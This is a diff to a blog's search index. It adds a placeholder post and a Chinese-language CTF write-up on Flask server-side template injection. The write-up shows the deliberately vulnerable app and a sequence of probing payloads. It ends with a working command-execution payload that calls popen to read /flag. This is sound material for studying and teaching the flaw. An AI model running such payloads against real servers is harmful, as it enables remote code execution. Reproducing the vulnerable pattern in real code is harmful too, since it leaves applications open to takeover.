@@ -7987,4 +7987,48 @@ API网关的权限检查
         <tag>KingOfStackMigrate</tag>
       </tags>
   </entry>
+  <entry>
+    <title>2026-8-11-DarkSword</title>
+    <url>/2026/08/11/2026-8-11-DarkSword/</url>
+    <content><![CDATA[<h3 id="DarkSword"><a href="#DarkSword" class="headerlink" title="DarkSword"></a>DarkSword</h3><p>待更新</p>
+]]></content>
+      <tags>
+        <tag>网络安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2026-8-14-SSTI</title>
+    <url>/2026/08/14/2026-8-14-SSTI/</url>
+    <content><![CDATA[<h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">FLAG = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.exists(<span class="string">&quot;/flag&quot;</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            FLAG = f.read().strip()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        FLAG = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;guest&quot;</span>)</span><br><span class="line"></span><br><span class="line">    template = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &lt;!doctype html&gt;</span></span><br><span class="line"><span class="string">    &lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;SSTI&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Welcome <span class="subst">&#123;name&#125;</span>&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">    &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span>,</span><br><span class="line">        port=<span class="number">5000</span>,</span><br><span class="line">        debug=<span class="literal">False</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
+
+<p>题目地址：https:&#x2F;&#x2F;www.ctfplus.cn&#x2F;problem-detail&#x2F;1983793861520003072&#x2F;description</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=&#123;&#123;2*2&#125;&#125; 响应 4</span><br><span class="line"></span><br><span class="line">name=&#123;&#123;config&#125;&#125; 响应 </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Welcome &lt;Config &#123;&#x27;DEBUG&#x27;: False, &#x27;TESTING&#x27;: False, &#x27;PROPAGATE_EXCEPTIONS&#x27;: None, &#x27;SECRET_KEY&#x27;: None, &#x27;SECRET_KEY_FALLBACKS&#x27;: None, &#x27;PERMANENT_SESSION_LIFETIME&#x27;: datetime.timedelta(days=31), &#x27;USE_X_SENDFILE&#x27;: False, &#x27;TRUSTED_HOSTS&#x27;: None, &#x27;SERVER_NAME&#x27;: None, &#x27;APPLICATION_ROOT&#x27;: &#x27;/&#x27;, &#x27;SESSION_COOKIE_NAME&#x27;: &#x27;session&#x27;, &#x27;SESSION_COOKIE_DOMAIN&#x27;: None, &#x27;SESSION_COOKIE_PATH&#x27;: None, &#x27;SESSION_COOKIE_HTTPONLY&#x27;: True, &#x27;SESSION_COOKIE_SECURE&#x27;: False, &#x27;SESSION_COOKIE_PARTITIONED&#x27;: False, &#x27;SESSION_COOKIE_SAMESITE&#x27;: None, &#x27;SESSION_REFRESH_EACH_REQUEST&#x27;: True, &#x27;MAX_CONTENT_LENGTH&#x27;: None, &#x27;MAX_FORM_MEMORY_SIZE&#x27;: 500000, &#x27;MAX_FORM_PARTS&#x27;: 1000, &#x27;SEND_FILE_MAX_AGE_DEFAULT&#x27;: None, &#x27;TRAP_BAD_REQUEST_ERRORS&#x27;: None, &#x27;TRAP_HTTP_EXCEPTIONS&#x27;: False, &#x27;EXPLAIN_TEMPLATE_LOADING&#x27;: False, &#x27;PREFERRED_URL_SCHEME&#x27;: &#x27;http&#x27;, &#x27;TEMPLATES_AUTO_RELOAD&#x27;: None, &#x27;MAX_COOKIE_SIZE&#x27;: 4093, &#x27;PROVIDE_AUTOMATIC_OPTIONS&#x27;: True&#125;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>构造对象链</p>
+<p>name&#x3D;’’.<strong>class</strong></p>
+<p>响应 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Welcome &lt;class &#x27;str&#x27;&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>name=&#123;&#123;%27%27.__class__.__mro__&#125;&#125;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Welcome (&lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br></pre></td></tr></table></figure>
+
+<p><code>name=&#123;&#123;%20%27%27.__class__.__mro__[1].__subclasses__()%20&#125;&#125;</code></p>
+<p>列出所有子类</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Welcome [&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;async_generator&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray_iterator&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes_iterator&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;builtin_function_or_method&#x27;&gt;, &lt;class &#x27;callable_iterator&#x27;&gt;, &lt;class &#x27;PyCapsule&#x27;&gt;, &lt;class &#x27;cell&#x27;&gt;, &lt;class &#x27;classmethod_descriptor&#x27;&gt;, &lt;class &#x27;classmethod&#x27;&gt;, &lt;class &#x27;code&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;coroutine&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;dict_itemiterator&#x27;&gt;, &lt;class &#x27;dict_keyiterator&#x27;&gt;, &lt;class &#x27;dict_valueiterator&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;mappingproxy&#x27;&gt;, &lt;class &#x27;dict_reverseitemiterator&#x27;&gt;, &lt;class &#x27;dict_reversekeyiterator&#x27;&gt;, &lt;class &#x27;dict_reversevalueiterator&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;ellipsis&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frame&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;function&#x27;&gt;, &lt;class &#x27;generator&#x27;&gt;, &lt;class &#x27;getset_descriptor&#x27;&gt;, &lt;class &#x27;instancemethod&#x27;&gt;,  ......</span><br></pre></td></tr></table></figure>
+
+<p>我们找到能执行命令的类</p>
+<p>例如 subprocess.Popen</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=&#123;&#123;%27%27.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__.popen(%27cat%20/flag%20/%27).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>拿到flag</p>
+]]></content>
+      <tags>
+        <tag>Python</tag>
+        <tag>网络安全</tag>
+      </tags>
+  </entry>
 </search>
